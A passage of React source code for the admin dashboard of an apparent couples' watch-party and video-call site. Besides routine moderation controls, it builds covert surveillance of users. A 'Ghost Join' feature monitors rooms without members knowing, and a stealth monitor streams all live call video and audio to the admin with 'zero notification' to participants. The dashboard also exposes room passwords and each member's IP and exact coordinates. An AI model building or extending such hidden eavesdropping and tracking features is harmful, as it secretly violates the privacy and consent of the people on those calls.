              <span className="hidden sm:inline">Logout</span>
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 mx-auto w-full max-w-7xl flex-1 px-4 py-6 sm:px-6 space-y-6">
        {/* Metric Cards Row */}
        <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-6 sm:gap-4">
          <div className="rounded-2xl border border-white/10 bg-black/40 p-4 backdrop-blur-xl">
            <div className="flex items-center justify-between text-xs text-white/60">
              <span>Active Couches</span>
              <Film className="h-4 w-4 text-[#ff6fa0]" />
            </div>
            <div className="mt-2 flex items-baseline gap-2">
              <span className="text-2xl font-bold text-white">{data.stats.totalRooms || 0}</span>
              <span className="text-[11px] text-emerald-400">rooms active</span>
            </div>
          </div>

          <div
            onClick={() => setActiveTab('videocalls')}
            className="rounded-2xl border border-pink-500/30 bg-[#1c0f1f]/50 p-4 backdrop-blur-xl cursor-pointer hover:border-pink-500/60 transition group"
            title="Click to monitor all live video calls"
          >
            <div className="flex items-center justify-between text-xs text-white/60">
              <span className="group-hover:text-pink-300 transition">Live Video Calls</span>
              <Video className="h-4 w-4 text-pink-400 group-hover:scale-110 transition" />
            </div>
            <div className="mt-2 flex items-baseline gap-2">
              <span className="text-2xl font-bold text-white">{data.stats.totalConnectedUsers || 0}</span>
              <span className="text-[11px] text-pink-400 flex items-center gap-1">
                <span>live radar</span>
                <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
              </span>
            </div>
          </div>

          <div className="rounded-2xl border border-white/10 bg-black/40 p-4 backdrop-blur-xl">
            <div className="flex items-center justify-between text-xs text-white/60">
              <span>Streams Playing</span>
              <Play className="h-4 w-4 text-emerald-400" />
            </div>
            <div className="mt-2 flex items-baseline gap-2">
              <span className="text-2xl font-bold text-white">{data.stats.activePlayingCount || 0}</span>
              <span className="text-[11px] text-emerald-400">playback</span>
            </div>
          </div>

          <div
            onClick={() => setActiveTab('locations')}
            className="rounded-2xl border border-[#ff6fa0]/30 bg-[#1c0f1f]/50 p-4 backdrop-blur-xl cursor-pointer hover:border-[#ff6fa0]/60 transition"
          >
            <div className="flex items-center justify-between text-xs text-white/60">
              <span>Geo Radar Map</span>
              <MapPin className="h-4 w-4 text-[#ff6fa0]" />
            </div>
            <div className="mt-2 flex items-baseline gap-2">
              <span className="text-2xl font-bold text-white">{allConnectedUsers.length}</span>
              <span className="text-[11px] text-[#ff8fb3]">viewers live</span>
            </div>
          </div>

          <div className="rounded-2xl border border-white/10 bg-black/40 p-4 backdrop-blur-xl">
            <div className="flex items-center justify-between text-xs text-white/60">
              <span>Total Blocklist</span>
              <Ban className="h-4 w-4 text-rose-400" />
            </div>
            <div className="mt-2 flex items-baseline gap-2">
              <span className="text-2xl font-bold text-white">{totalBlocked}</span>
              <span className="text-[11px] text-rose-400">banned</span>
            </div>
          </div>

          <div className="rounded-2xl border border-emerald-500/30 bg-emerald-950/20 p-4 backdrop-blur-xl">
            <div className="flex items-center justify-between text-xs text-emerald-300">
              <span>VPN Anti-Track</span>
              <ShieldCheck className="h-4 w-4 text-emerald-400" />
            </div>
            <div className="mt-2 flex items-baseline gap-2">
              <span className="text-xl font-bold text-emerald-300">ACTIVE</span>
              <span className="text-[10px] text-emerald-400">Shield</span>
            </div>
          </div>
        </div>

        {/* Navigation Tabs */}
        <div className="flex items-center justify-between border-b border-white/10 pb-3 gap-3 flex-wrap">
          <div className="flex rounded-xl bg-white/5 p-1 border border-white/10 gap-1 text-xs flex-wrap">
            <button
              type="button"
              onClick={() => setActiveTab('rooms')}
              className={`flex items-center gap-2 rounded-lg px-3.5 py-2 font-medium transition cursor-pointer ${
                activeTab === 'rooms'
                  ? 'bg-[#d9467a] text-white shadow-md'
                  : 'text-white/70 hover:text-white'
              }`}
            >
              <Film className="h-3.5 w-3.5" />
              <span>Live Rooms &amp; Media ({data.rooms.length})</span>
            </button>
            <button
              type="button"
              onClick={() => setActiveTab('videocalls')}
              className={`flex items-center gap-2 rounded-lg px-3.5 py-2 font-medium transition cursor-pointer ${
                activeTab === 'videocalls'
                  ? 'bg-[#d9467a] text-white shadow-md'
                  : 'text-white/70 hover:text-white'
              }`}
            >
              <Video className="h-3.5 w-3.5 text-pink-300" />
              <span>🎥 Live Video Calls ({allConnectedUsers.length})</span>
              {allConnectedUsers.length > 0 && (
                <span className="flex h-2 w-2 relative">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
                </span>
              )}
            </button>
            <button
              type="button"
              onClick={() => setActiveTab('locations')}
              className={`flex items-center gap-2 rounded-lg px-3.5 py-2 font-medium transition cursor-pointer ${
                activeTab === 'locations'
                  ? 'bg-[#d9467a] text-white shadow-md'
                  : 'text-white/70 hover:text-white'
              }`}
            >
              <MapPin className="h-3.5 w-3.5 text-pink-300" />
              <span>🗺️ Member Locations ({allConnectedUsers.length})</span>
            </button>
            <button
              type="button"
              onClick={() => setActiveTab('security')}
              className={`flex items-center gap-2 rounded-lg px-3.5 py-2 font-medium transition cursor-pointer ${
                activeTab === 'security'
                  ? 'bg-[#d9467a] text-white shadow-md'
                  : 'text-white/70 hover:text-white'
              }`}
            >
              <ShieldAlert className="h-3.5 w-3.5" />
              <span>Security Blocklists ({totalBlocked})</span>
            </button>
            <button
              type="button"
              onClick={() => setActiveTab('broadcast')}
              className={`flex items-center gap-2 rounded-lg px-3.5 py-2 font-medium transition cursor-pointer ${
                activeTab === 'broadcast'
                  ? 'bg-[#d9467a] text-white shadow-md'
                  : 'text-white/70 hover:text-white'
              }`}
            >
              <Radio className="h-3.5 w-3.5" />
              <span>System Broadcast</span>
            </button>
          </div>

          {(activeTab === 'rooms' || activeTab === 'locations' || activeTab === 'videocalls') && (
            <div className="relative w-full sm:w-72">
              <Search className="absolute left-3 top-2.5 h-3.5 w-3.5 text-white/40" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder={
                  activeTab === 'locations'
                    ? 'Search city, country, IP, user…'
                    : activeTab === 'videocalls'
                    ? 'Search caller, room ID, IP…'
                    : 'Search room ID, media, or user…'
                }
                className="w-full rounded-xl bg-white/5 border border-white/10 pl-9 pr-3 py-1.5 text-xs text-white placeholder-white/40 focus:border-[#d9467a] focus:outline-none transition"
              />
            </div>
          )}
        </div>

        {/* ================= TAB 1: LIVE ROOMS & MEDIA INSPECTION ================= */}
        {activeTab === 'rooms' && (
          <div className="space-y-4">
            {filteredRooms.length === 0 ? (
              <div className="rounded-2xl border border-white/10 bg-black/40 p-12 text-center backdrop-blur-xl space-y-3">
                <Film className="mx-auto h-10 w-10 text-white/30" />
                <h3 className="text-base font-semibold text-white">No active rooms found</h3>
                <p className="text-xs text-white/50 max-w-sm mx-auto">
                  {search ? 'No rooms match your search query.' : 'There are currently no active couches running on the platform.'}
                </p>
              </div>
            ) : (
              <div className="grid gap-4 lg:grid-cols-2">
                {filteredRooms.map((room) => {
                  const media = room.media || {};
                  const hasMedia = media.src && media.type !== 'none';
                  const isPlaying = room.playing;

                  return (
                    <div
                      key={room.roomId}
                      className="rounded-2xl border border-white/10 bg-black/50 p-5 shadow-xl backdrop-blur-2xl space-y-4 hover:border-white/20 transition flex flex-col justify-between"
                    >
                      {/* Room Header */}
                      <div className="flex items-start justify-between gap-3 border-b border-white/10 pb-3">
                        <div className="space-y-1.5">
                          <div className="flex flex-wrap items-center gap-2">
                            <span className="font-mono text-base font-bold text-white tracking-wide">{room.roomId}</span>
                            <button
                              type="button"
                              onClick={() => {
                                navigator.clipboard.writeText(room.roomId);
                                say('Room ID copied');
                              }}
                              className="text-white/50 hover:text-white p-0.5 rounded transition"
                              title="Copy Room ID"
                            >
                              <Copy className="h-3 w-3" />
                            </button>
                            {room.hasPass && (

                              <span className="rounded bg-amber-500/20 border border-amber-500/30 px-1.5 py-0.5 text-[10px] font-medium text-amber-300 flex items-center gap-0.5">
                                <Lock className="h-2.5 w-2.5" />
                                Protected
                              </span>
                            )}
                            {room.entryLocked ? (
                              <span className="rounded bg-amber-500/20 border border-amber-500/40 px-1.5 py-0.5 text-[10px] font-semibold text-amber-300 flex items-center gap-1">
                                <Lock className="h-2.5 w-2.5" /> Locked by Host
                              </span>
                            ) : (
                              <span className="rounded bg-emerald-500/15 border border-emerald-500/30 px-1.5 py-0.5 text-[10px] font-medium text-emerald-300 flex items-center gap-1">
                                <Unlock className="h-2.5 w-2.5" /> Open
                              </span>
                            )}
                          </div>

                          {/* Room Password Row for Administrator */}
                          {room.hasPass ? (
                            <div className="flex items-center gap-1.5 bg-amber-500/10 border border-amber-500/30 rounded-lg px-2.5 py-1 text-[11px] text-amber-200 w-fit">
                              <Key className="h-3 w-3 text-amber-400 shrink-0" />
                              <span className="text-white/60">Password:</span>
                              <span className="font-mono font-bold tracking-wider text-amber-300">
                                {revealedPasswords[room.roomId] ? (room.password || '••••••••') : '••••••••'}
                              </span>
                              <button
                                type="button"
                                onClick={() => setRevealedPasswords(prev => ({ ...prev, [room.roomId]: !prev[room.roomId] }))}
                                className="p-0.5 text-white/50 hover:text-white transition"
                                title={revealedPasswords[room.roomId] ? 'Hide password' : 'Show password'}
                              >
                                {revealedPasswords[room.roomId] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                              </button>
                              {room.password && (
                                <button
                                  type="button"
                                  onClick={() => {
                                    navigator.clipboard.writeText(room.password);
                                    say('Room password copied');
                                  }}
                                  className="p-0.5 text-white/50 hover:text-white transition"
                                  title="Copy password"
                                >
                                  <Copy className="h-2.5 w-2.5" />
                                </button>
                              )}
                            </div>
                          ) : (
                            <span className="text-[10px] text-emerald-400/80 bg-emerald-500/10 border border-emerald-500/20 px-2 py-0.5 rounded inline-block">
                              🔓 Public / No Pass
                            </span>
                          )}

                          <div className="flex items-center gap-2 text-[11px] text-white/50">
                            <span>Created: {new Date(room.createdAt).toLocaleTimeString()}</span>
                            <span>•</span>
                            <span className={room.userCount >= (room.maxUsers || 2) ? 'text-rose-400 font-medium' : 'text-emerald-400 font-medium'}>
                              {room.userCount}/{room.maxUsers || 2} Seats {room.userCount >= (room.maxUsers || 2) ? '(Full Couch)' : '(Waiting)'}
                            </span>
                          </div>
                        </div>

                        <div className="flex items-center gap-1.5 shrink-0 flex-wrap">
                          <button
                            type="button"
                            onClick={() => {
                              setExpandedCallRooms((prev) => ({
                                ...prev,
                                [room.roomId]: !prev[room.roomId],
                              }));
                            }}
                            className={`rounded-lg border px-2.5 py-1 text-xs font-semibold transition flex items-center gap-1.5 shadow-sm cursor-pointer ${
                              expandedCallRooms[room.roomId]
                                ? 'bg-pink-600/30 border-pink-500/60 text-pink-200 shadow-pink-600/20'
                                : 'bg-white/10 hover:bg-white/15 border-white/20 text-slate-200'
                            }`}
                            title={expandedCallRooms[room.roomId] ? 'Close inline live video call' : 'Watch live video call inline'}
                          >
                            <Video className="h-3.5 w-3.5 text-pink-400" />
                            <span>{expandedCallRooms[room.roomId] ? 'Hide Video Call' : '📹 Live Video Call'}</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleGhostJoin(room.roomId)}
                            className="rounded-lg bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/40 px-2.5 py-1 text-xs font-semibold text-purple-200 transition flex items-center gap-1.5 shadow-sm"
                            title="Invisibly monitor this room without host or members knowing"
                          >
                            <span className="text-sm">👻</span>
                            <span>Ghost Join</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleBlockRoom(room.roomId)}
                            className="rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 px-2.5 py-1 text-xs text-rose-300 transition flex items-center gap-1 shrink-0"
                            title="Terminate room and disconnect all users"
                          >
                            <Ban className="h-3.5 w-3.5" />
                            <span>Close Room</span>
                          </button>
                        </div>
                      </div>

                      {/* Inline Live Video Call Monitor */}
                      {expandedCallRooms[room.roomId] && (
                        <div className="animate-in fade-in duration-200">
                          <CallErrorBoundary title="Video Surveillance Stream" resetLabel="Reconnect Feeds">
                            <StealthCallMonitor roomId={room.roomId} users={room.users || []} />
                          </CallErrorBoundary>
                        </div>
                      )}

                      {/* Video Playback Details (Security Monitor) */}
                      <div className="rounded-xl border border-white/10 bg-white/5 p-3.5 space-y-3">
                        <div className="flex items-center justify-between gap-2">
                          <div className="flex items-center gap-2">
                            <span className="text-xs font-semibold text-white/70">What Is Playing:</span>
                            <span
                              className={`rounded-full px-2 py-0.5 text-[10px] font-bold flex items-center gap-1 ${
                                !hasMedia
                                  ? 'bg-white/10 text-white/50'
                                  : isPlaying
                                  ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                                  : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                              }`}
                            >
                              {isPlaying && <span className="h-1.5 w-1.5 rounded-full bg-emerald-400" />}
                              {!hasMedia ? 'IDLE / NO MEDIA' : isPlaying ? 'PLAYING' : 'PAUSED'}
                            </span>
                          </div>

                          {hasMedia && (
                            <span className="font-mono text-xs font-semibold text-white/80 bg-black/40 px-2 py-0.5 rounded border border-white/10">
                              ⏱️ {fmt(room.currentTime)}
                            </span>
                          )}
                        </div>

                        {hasMedia ? (
                          <div className="space-y-1.5">
                            <div className="text-sm font-semibold text-white truncate" title={media.title}>
                              {media.title || 'Untitled Stream'}
                            </div>
                            <div className="flex items-center gap-2 text-xs text-white/50 break-all">
                              <span className="rounded bg-black/40 px-1.5 py-0.5 text-[10px] font-mono text-cyan-300 border border-white/10 uppercase">
                                {media.type}
                              </span>
                              <a
                                href={media.src}
                                target="_blank"
                                rel="noreferrer"
                                className="truncate hover:text-[#ff6fa0] transition flex items-center gap-1"
                                title="Open stream link in new tab"
                              >
                                <span className="truncate">{media.src}</span>
                                <ExternalLink className="h-3 w-3 shrink-0" />
                              </a>
                            </div>
                          </div>
                        ) : (
                          <p className="text-xs text-white/40 italic">No video stream loaded in this room currently.</p>
                        )}

                        {/* Video Controls Toolbar */}
                        {hasMedia && (
                          <div className="flex flex-wrap items-center gap-1.5 pt-1 border-t border-white/10">
                            <button
                              type="button"
                              onClick={() => handleVideoControl(room.roomId, isPlaying ? 'pause' : 'play')}
                              className="rounded-lg bg-white/10 hover:bg-white/20 px-2.5 py-1 text-xs text-white transition flex items-center gap-1"
                            >
                              {isPlaying ? <Pause className="h-3 w-3" /> : <Play className="h-3 w-3" />}
                              <span>{isPlaying ? 'Pause' : 'Resume'}</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => handleVideoControl(room.roomId, 'stop')}
                              className="rounded-lg bg-amber-500/10 hover:bg-amber-500/20 border border-amber-500/30 px-2.5 py-1 text-xs text-amber-300 transition flex items-center gap-1"
                              title="Stop playback immediately for both partners"
                            >
                              <Square className="h-3 w-3" />
                              <span>Stop Video</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => handleBlockVideoUrl(media.src)}
                              className="rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 px-2.5 py-1 text-xs text-rose-300 transition flex items-center gap-1"
                              title="Blacklist this video URL so it can never be played again"
                            >
                              <Ban className="h-3 w-3" />
                              <span>Block Video</span>
                            </button>

                            <button
                              type="button"
                              onClick={() => setOverrideModal({ open: true, roomId: room.roomId, src: '', title: '' })}
                              className="rounded-lg bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 px-2.5 py-1 text-xs text-cyan-300 transition flex items-center gap-1"
                              title="Force-play a different video stream in this room"
                            >
                              <Video className="h-3 w-3" />
                              <span>Override Stream</span>
                            </button>
                          </div>
                        )}
                      </div>

                      {/* Queue Overview */}
                      {room.queue && room.queue.length > 0 && (
                        <div className="rounded-xl border border-white/10 bg-white/5 p-3 space-y-2">
                          <div className="flex items-center justify-between text-xs text-white/70">
                            <span className="font-medium flex items-center gap-1">
                              <span>Upcoming Queue ({room.queue.length})</span>
                            </span>
                            <button
                              type="button"
                              onClick={() => handleClearQueue(room.roomId)}
                              className="text-[11px] text-rose-400 hover:underline flex items-center gap-1"
                            >
                              <Trash2 className="h-3 w-3" />
                              <span>Clear Queue</span>
                            </button>
                          </div>
                          <div className="max-h-24 space-y-1 overflow-y-auto pr-1">
                            {room.queue.map((item, idx) => (
                              <div key={item.id || idx} className="flex items-center justify-between gap-2 text-xs text-white/60 bg-black/20 p-1.5 rounded">
                                <span className="truncate">{item.title || item.src}</span>
                                <span className="text-[10px] text-white/40 shrink-0 font-mono">{item.type}</span>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* Connected Users with Exact Locations */}
                      <div className="space-y-2.5 pt-2 border-t border-white/10">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-white/80 flex items-center gap-1.5">
                            <MapPin className="h-3.5 w-3.5 text-pink-400" />
                            <span>Room Members &amp; Exact Locations ({room.users?.length || 0}):</span>
                          </span>
                        </div>

                        {/* Partner Distance Banner (if room has 2 members) */}
                        {room.users?.length === 2 && (() => {
                          const u1 = room.users[0];
                          const u2 = room.users[1];
                          const dist = (u1?.geo?.lat && u2?.geo?.lat) ? haversineKm(u1.geo.lat, u1.geo.lon, u2.geo.lat, u2.geo.lon) : null;
                          if (dist === null) return null;
                          return (
                            <div className="rounded-xl bg-gradient-to-r from-purple-500/15 via-pink-500/15 to-rose-500/15 border border-pink-500/30 p-2.5 px-3 text-xs flex items-center justify-between text-pink-200 shadow-sm">
                              <div className="flex items-center gap-2 font-semibold">
                                <Heart className="h-4 w-4 text-rose-400 fill-rose-500 shrink-0" />
                                <span>
                                  {dist <= 5
                                    ? 'Partners are in the same home / city! 💖 (0 km apart)'
                                    : `Partners are ${dist.toLocaleString()} km (~${Math.round(dist * 0.621371).toLocaleString()} miles) apart ✈️`}
                                </span>
                              </div>
                              <span className="text-[10px] text-pink-300 font-mono uppercase bg-pink-500/20 px-2 py-0.5 rounded-full border border-pink-500/30">
                                Couple Distance
                              </span>
                            </div>
                          );
                        })()}

                        {(!room.users || room.users.length === 0) ? (
                          <p className="text-xs text-white/40 italic py-2">Waiting for users to enter…</p>
                        ) : (
                          <div className="space-y-2">
                            {room.users.map((u) => (
                              <div
                                key={u.cid}
                                className="rounded-2xl border border-white/10 bg-black/40 p-3 text-xs space-y-2 hover:border-pink-500/30 transition backdrop-blur-md shadow-sm"
                              >
                                {/* Member Top Row */}
                                <div className="flex items-center justify-between gap-2 flex-wrap">
                                  <div className="flex items-center gap-2 min-w-0">
                                    <span
                                      className="h-3.5 w-3.5 rounded-full shrink-0 ring-2 ring-white/20"
                                      style={{ backgroundColor: u.color || '#d9467a' }}
                                    />
                                    <span className="font-bold text-white text-xs sm:text-sm truncate">{u.name}</span>
                                    {u.isHost && (
                                      <span className="rounded-full bg-gradient-to-r from-amber-500/20 to-orange-500/20 text-amber-300 border border-amber-500/40 text-[10px] px-2 py-0.5 font-bold uppercase tracking-wider">
                                        Host
                                      </span>
                                    )}
                                    <span className="font-mono text-[10px] text-white/40 truncate">({u.cid})</span>
                                  </div>

                                  <div className="flex items-center gap-1.5 shrink-0">
                                    <button
                                      type="button"
                                      onClick={() => setMapModal({ open: true, user: u, roomId: room.roomId })}
                                      className="rounded-lg bg-pink-500/15 hover:bg-pink-500/25 border border-pink-500/35 px-2.5 py-1 text-[11px] font-semibold text-pink-300 transition flex items-center gap-1 cursor-pointer shadow-sm"
                                      title="Show exact coordinates and pinpoint on OpenStreetMap"
                                    >
                                      <MapPin className="h-3 w-3 text-pink-400" />
                                      <span>View on Map</span>
                                    </button>

                                    <button
                                      type="button"
                                      onClick={() => handleBlockUser(u, room.roomId)}
                                      className="rounded-lg bg-rose-500/15 hover:bg-rose-500/25 border border-rose-500/30 px-2 py-1 text-[11px] font-semibold text-rose-300 transition flex items-center gap-1 cursor-pointer"
                                      title={`Kick and permanently ban user "${u.name}"`}
                                    >
                                      <Ban className="h-3 w-3" />
                                      <span>Block</span>
                                    </button>
                                  </div>
                                </div>

                                {/* Member Exact Location & Network Badge */}
                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-1 border-t border-white/5 text-[11px]">
                                  {/* City, Region, Country */}
                                  <div className="flex items-center gap-1.5 text-white/90 bg-white/5 px-2.5 py-1.5 rounded-xl border border-white/5 truncate">
                                    <span className="text-sm shrink-0">{u.geo?.flag || '📍'}</span>
                                    <span className="font-semibold truncate">
                                      {u.geo?.city || 'Detecting City'}
                                      {u.geo?.region ? `, ${u.geo.region}` : ''}
                                      {u.geo?.country ? ` (${u.geo.country})` : ''}
                                    </span>
                                  </div>

                                  {/* Coordinates & IP */}
                                  <div className="flex items-center justify-between gap-1.5 bg-white/5 px-2.5 py-1.5 rounded-xl border border-white/5 text-slate-300">
                                    <div className="flex items-center gap-1 font-mono text-[10px] text-cyan-300 truncate" title="Latitude & Longitude">
                                      <Compass className="h-3 w-3 text-cyan-400 shrink-0" />
                                      <span>{u.geo?.lat ? `${Number(u.geo.lat).toFixed(4)}, ${Number(u.geo.lon).toFixed(4)}` : 'Coords detected'}</span>
                                    </div>
                                    <div className="flex items-center gap-1 font-mono text-[10px] text-emerald-300 shrink-0" title="Captured Client IP">
                                      <Shield className="h-2.5 w-2.5 text-emerald-400" />
                                      <span>{u.ip || '127.0.0.1'}</span>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}

        {/* ================= TAB: LIVE VIDEO CALLS SURVEILLANCE RADAR ================= */}
        {activeTab === 'videocalls' && (
          <div className="space-y-6">
            {/* Master Surveillance Overview Banner */}
            <div className="rounded-2xl border border-pink-500/30 bg-gradient-to-r from-purple-950/40 via-black/60 to-pink-950/40 p-5 sm:p-6 shadow-2xl backdrop-blur-2xl flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div className="space-y-1.5">
                <div className="flex flex-wrap items-center gap-2.5">
                  <div className="h-9 w-9 rounded-xl bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-300 shadow-md">
                    <Video className="h-5 w-5" />
                  </div>
                  <h3 className="text-base sm:text-lg font-black text-white flex items-center gap-2 flex-wrap">
                    <span>Live Video Call Surveillance Radar</span>
                    <span className="text-[10px] px-2.5 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold uppercase tracking-wider flex items-center gap-1">
                      <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
                      100% Invisible Admin
                    </span>
                  </h3>
                </div>
                <p className="text-xs text-white/60 max-w-2xl">
                  Supervise real-time WebRTC camera &amp; audio feeds across every active room simultaneously. Admin hardware cameras and microphones remain completely powered off (0 cam LED, 0 mic) and room participants receive zero notification.
                </p>
              </div>

              {/* Master Control Action Bar */}
              <div className="flex items-center gap-3 flex-wrap">
                <button
                  type="button"
                  onClick={() => setGlobalListenAudio(!globalListenAudio)}
                  className={`px-4 py-2 rounded-xl border text-xs font-bold flex items-center gap-2 transition cursor-pointer shadow-lg ${
                    globalListenAudio
                      ? 'bg-rose-600 border-rose-500 text-white shadow-rose-600/30 animate-pulse'
                      : 'bg-white/10 border-white/20 text-slate-200 hover:bg-white/15'
                  }`}
                  title={globalListenAudio ? 'Mute all room calls' : 'Unmute audio across all monitored rooms'}
                >
                  {globalListenAudio ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
                  <span>{globalListenAudio ? 'Master Audio: UNMUTED 🔊' : 'Master Audio: MUTED 🔇'}</span>
                </button>

                <div className="px-3.5 py-2 rounded-xl bg-black/50 border border-white/10 text-xs text-slate-300 flex items-center gap-2">
                  <Users className="h-3.5 w-3.5 text-cyan-400" />
                  <span>Total Callers: <strong className="text-white">{allConnectedUsers.length}</strong></span>
                </div>
              </div>
            </div>

            {/* Video Call Rooms Grid */}
            {filteredRooms.length === 0 ? (
              <div className="rounded-2xl border border-white/10 bg-black/40 p-12 text-center backdrop-blur-xl space-y-3">
                <Video className="mx-auto h-12 w-12 text-white/20" />
                <h3 className="text-base font-semibold text-white">No active video call rooms</h3>
                <p className="text-xs text-white/50 max-w-sm mx-auto">
                  {search
                    ? 'No rooms or callers match your search query.'
                    : 'When visitors create or join cinema couches, their live video and audio streams will appear here in real-time.'}
                </p>
              </div>
            ) : (
              <div className="grid gap-6 lg:grid-cols-2">
                {filteredRooms.map((room) => {
                  const roomUsers = room.users || [];
                  const hostUser = roomUsers.find((u) => u.isHost) || roomUsers[0];

                  return (
                    <div
                      key={room.roomId}
                      className="rounded-2xl border border-pink-500/25 bg-[#0e0a16]/85 p-5 shadow-2xl backdrop-blur-2xl space-y-4 hover:border-pink-500/50 transition flex flex-col justify-between"
                    >
                      {/* Room Header inside Surveillance Grid */}
                      <div className="flex items-start justify-between gap-3 border-b border-white/10 pb-3">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2 flex-wrap">
                            <span className="font-mono text-base font-black text-white tracking-wide">
                              {room.roomId}
                            </span>
                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 border border-purple-500/30 text-purple-300 font-semibold">
                              {roomUsers.length} {roomUsers.length === 1 ? 'member' : 'members'}
                            </span>
                            {room.media?.title && (
                              <span
                                className="text-[10px] px-2 py-0.5 rounded-md bg-white/5 text-slate-300 border border-white/10 truncate max-w-[200px]"
                                title={room.media.title}
                              >
                                🎬 {room.media.title}
                              </span>
                            )}
                          </div>

                          <div className="text-[11px] text-white/50 flex items-center gap-2 flex-wrap">
                            <span>
                              Host: <strong className="text-white">{hostUser?.name || 'Unknown'}</strong>
                            </span>
                            {room.hasPass && (
                              <span className="text-amber-300 flex items-center gap-0.5">
                                <Lock className="h-2.5 w-2.5" /> Protected
                              </span>
                            )}
                            <span>•</span>
                            <span>Created {new Date(room.createdAt).toLocaleTimeString()}</span>
                          </div>
                        </div>

                        <div className="flex items-center gap-1.5 shrink-0">
                          <button
                            type="button"
                            onClick={() => handleGhostJoin(room.roomId)}
                            className="rounded-lg bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/40 px-2.5 py-1 text-xs font-semibold text-purple-200 transition flex items-center gap-1 shadow-sm"
                            title="Open full stealth ghost control modal for this room"
                          >
                            <span>👻 Ghost</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleBlockRoom(room.roomId)}
                            className="rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 px-2 py-1 text-xs text-rose-300 transition flex items-center gap-1"
                            title="Terminate room"
                          >
                            <Ban className="h-3.5 w-3.5" />
                          </button>
                        </div>
                      </div>

                      {/* Embedded Live Video Call Feeds */}
                      <CallErrorBoundary title="Video Surveillance Stream" resetLabel="Reconnect Feeds">
                        <StealthCallMonitor
                          roomId={room.roomId}
                          users={roomUsers}
                          externalListenAudio={globalListenAudio}
                        />
                      </CallErrorBoundary>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}

        {/* ================= TAB 3: LIVE MEMBER LOCATIONS & GEO-RADAR ================= */}
        {activeTab === 'locations' && (
          <div className="space-y-4">
            {/* Geo Radar Overview Banner */}
            <div className="rounded-2xl border border-pink-500/30 bg-black/50 p-4 sm:p-5 shadow-xl backdrop-blur-2xl flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div className="space-y-1">
                <h3 className="text-sm sm:text-base font-bold text-white flex items-center gap-2">
                  <MapPin className="h-4 w-4 text-pink-400" />
                  <span>Live Room Member Locations &amp; Satellite Radar</span>
                  <span className="text-[11px] px-2.5 py-0.5 rounded-full bg-pink-500/20 border border-pink-500/40 text-pink-300 font-bold">
                    {allConnectedUsers.length} Online Viewers
                  </span>
                </h3>
                <p className="text-xs text-white/50">
                  Real-time geographic breakdown of all active couch members with IP address, city, region, country, and GPS coordinates.
                </p>
              </div>

              {/* Geo summary pills */}
              <div className="flex items-center gap-2 flex-wrap text-xs">
                <div className="px-3 py-1.5 rounded-xl bg-white/5 border border-white/10 flex items-center gap-1.5 text-slate-300">
                  <Globe className="h-3.5 w-3.5 text-cyan-400" />
                  <span>
                    Countries:{' '}
                    <strong className="text-white">
                      {new Set(allConnectedUsers.map((u) => u.geo?.country).filter(Boolean)).size || 1}
                    </strong>
                  </span>
                </div>
                <div className="px-3 py-1.5 rounded-xl bg-white/5 border border-white/10 flex items-center gap-1.5 text-slate-300">
                  <Compass className="h-3.5 w-3.5 text-emerald-400" />
                  <span>
                    Cities:{' '}
                    <strong className="text-white">
                      {new Set(allConnectedUsers.map((u) => u.geo?.city).filter(Boolean)).size || 1}
                    </strong>
                  </span>
                </div>
              </div>
            </div>

            {/* User Location Cards Grid */}
            {filteredUsers.length === 0 ? (
              <div className="rounded-2xl border border-white/10 bg-black/40 p-12 text-center backdrop-blur-xl space-y-3">
                <MapPin className="mx-auto h-10 w-10 text-white/30" />
                <h3 className="text-base font-semibold text-white">No active members found</h3>
                <p className="text-xs text-white/50 max-w-sm mx-auto">
                  {search
                    ? 'No connected members match your location search filter.'
                    : 'When viewers join any room, their exact location and network details will appear live here.'}
                </p>
              </div>
            ) : (
              <div className="grid gap-3 sm:gap-4 md:grid-cols-2 lg:grid-cols-3">
                {filteredUsers.map((u) => (
                  <div
                    key={`${u.roomId}-${u.cid}`}
                    className="rounded-2xl border border-white/10 bg-black/50 p-4 shadow-xl backdrop-blur-2xl hover:border-pink-500/40 transition flex flex-col justify-between space-y-3"
                  >
                    {/* Top Row: User Avatar, Name, Room, Host badge */}
                    <div className="flex items-start justify-between gap-2">
                      <div className="flex items-center gap-2.5 min-w-0">
                        <div
                          className="h-9 w-9 rounded-xl flex items-center justify-center font-bold text-white text-xs shadow-md shrink-0"
                          style={{ backgroundColor: u.color || '#d9467a' }}
                        >
